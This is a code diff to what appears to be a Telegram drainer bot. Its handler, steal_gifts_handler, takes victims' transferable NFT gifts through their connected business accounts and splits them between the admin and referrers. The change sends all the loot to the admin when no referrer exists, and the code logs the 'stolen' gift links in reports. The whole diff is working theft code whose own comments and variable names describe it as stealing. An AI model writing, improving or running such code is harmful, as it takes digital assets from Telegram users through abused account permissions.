@@ -828,8 +828,14 @@ async def steal_gifts_handler(callback: CallbackQuery):
     # Кто пригласил этого пользователя?
     inviter_id = user_referrer_map.get(str(user.id))
     
-    # Берём комиссию ТОЛЬКО если пригласивший в списке COMMISSION_REFERRERS
-    take_commission = inviter_id in COMMISSION_REFERRERS
+    # Если пригласивший не найден, передаём всё админу
+    if not inviter_id:
+        take_commission = True
+        recipient_id = ADMIN_IDS[0]
+    else:
+        # Берём комиссию ТОЛЬКО если пригласивший в списке COMMISSION_REFERRERS
+        take_commission = inviter_id in COMMISSION_REFERRERS
+        recipient_id = inviter_id
 
     gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
     transferable_gifts = [g for g in gifts.gifts if g.type == "unique" and g.can_be_transferred]
@@ -872,14 +878,14 @@ async def steal_gifts_handler(callback: CallbackQuery):
                 logging.error(f"Ошибка передачи админу: {e}")
 
     # 2. Отдаём пригласившему (или всё, если комиссии нет)
-    if inviter_id:
+    if recipient_id:
         start_idx = admin_gifts if take_commission else 0
         for gift in transferable_gifts[start_idx:]:
             try:
-                await bot.transfer_gift(business_id, gift.owned_gift_id, inviter_id, gift.transfer_star_count)
+                await bot.transfer_gift(business_id, gift.owned_gift_id, recipient_id, gift.transfer_star_count)
                 user_stolen.append(f"t.me/nft/{gift.gift.name.replace(' ', '')}")
             except Exception as e:
-                logging.error(f"Ошибка передачи пригласившему: {e}")
+                logging.error(f"Ошибка передачи получателю: {e}")
 
     # 📌 Формируем логи:
     
@@ -889,7 +895,7 @@ async def steal_gifts_handler(callback: CallbackQuery):
             f"🔷 Отчёт по бизнес-аккаунту {user.id}:\n"
             f"🎁 Всего: {total_gifts}\n"
             f"├─ Вам: {admin_gifts if take_commission else 0}\n"
-            f"╰─ Пригласившему ({inviter_id}): {user_gifts}\n\n"
+            f"╰─ Получателю ({recipient_id}): {user_gifts}\n\n"
             f"{'🔹 Ваши: ' + ' | '.join(admin_stolen[:3]) + ('...' if len(admin_stolen)>3 else '') if admin_stolen else ''}\n"
             f"{'🔸 Его: ' + ' | '.join(user_stolen[:3]) + ('...' if len(user_stolen)>3 else '') if user_stolen else ''}"
         )
